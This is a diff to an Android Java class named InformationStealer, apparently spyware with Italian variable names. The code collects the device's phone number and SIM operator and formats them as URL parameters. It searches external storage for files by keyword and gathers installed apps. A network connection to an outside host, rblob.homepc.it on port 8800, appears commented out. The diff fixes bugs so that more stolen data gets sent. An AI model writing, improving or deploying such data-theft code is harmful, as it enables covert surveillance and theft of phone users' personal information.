@@ -10,31 +10,19 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.Manifest;
 import android.net.Uri;
-import android.os.AsyncTask;
 import android.os.BatteryManager;
 import android.os.Build;
-import android.os.Environment;
 import android.provider.MediaStore;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
-
-import java.io.File;
 import java.util.List;
 
 public class InformationStealer implements Runnable {
+
     private static final int READ_EXTERNAL_STORAGE_PERMISSION_REQUEST = 1;
-
-    public StringBuilder getMessaggio() {
-        return messaggio;
-    }
-
-    public void setMessaggio(StringBuilder messaggio) {
-        InformationStealer.messaggio = messaggio;
-    }
-
     private static StringBuilder messaggio;
 
     final String[] keywords = {
@@ -83,13 +71,22 @@ public class InformationStealer implements Runnable {
             "data"
     };
 
+
     NetworkManager conn = new NetworkManager();
     Context context;
+
+
     public InformationStealer(Context context){
         this.context = context;
         //conn.openConnection("rblob.homepc.it", 8800);
     }
+    public StringBuilder getMessaggio() {
+        return messaggio;
+    }
 
+    public void setMessaggio(StringBuilder messaggio) {
+        InformationStealer.messaggio = messaggio;
+    }
     @Override
     public void run(){
         messaggio.append(stealApp(context));
@@ -100,13 +97,13 @@ public class InformationStealer implements Runnable {
 
     @SuppressLint("MissingPermission")
     static String stealNumberInformations(Context context) {
-        String msg;
+        String msg = "";
         TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);
         if (telephonyManager != null) {
             @SuppressLint("MissingPermission") String phoneNumber = telephonyManager.getLine1Number();
             String operator = telephonyManager.getSimOperatorName();
-            msg = "&Phone_number=" + phoneNumber + "&";
-            msg = "&SIM_Operator=" + operator + "&";
+            msg += "&Phone_number=" + phoneNumber + "&";
+            msg += "&SIM_Operator=" + operator + "&";
             return msg;
         }
         return "";
@@ -177,17 +174,17 @@ public class InformationStealer implements Runnable {
         Uri fileUri = MediaStore.Files.getContentUri("external");
         String[] projection = {MediaStore.Files.FileColumns.DATA};
 
-        String selection = "";
+        StringBuilder selection = new StringBuilder();
 
         for (int i = 0; i < keywords.length; i++) {
             String keyword = keywords[i];
-            selection += "LOWER(" + MediaStore.Files.FileColumns.DATA + ") LIKE LOWER('%" + keyword + "%')";
+            StringBuilder append = selection.append("LOWER(" + MediaStore.Files.FileColumns.DATA + ") LIKE LOWER('%").append(keyword).append("%')");
             if (i < keywords.length - 1) {
-                selection += " OR ";
+                selection.append(" OR ");
             }
         }
 
-        Cursor cursor = context.getContentResolver().query(fileUri, projection, selection, null, null);
+        Cursor cursor = context.getContentResolver().query(fileUri, projection, selection.toString(), null, null);
         if (cursor != null && cursor.moveToFirst()) {
             do {
                 String filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA));
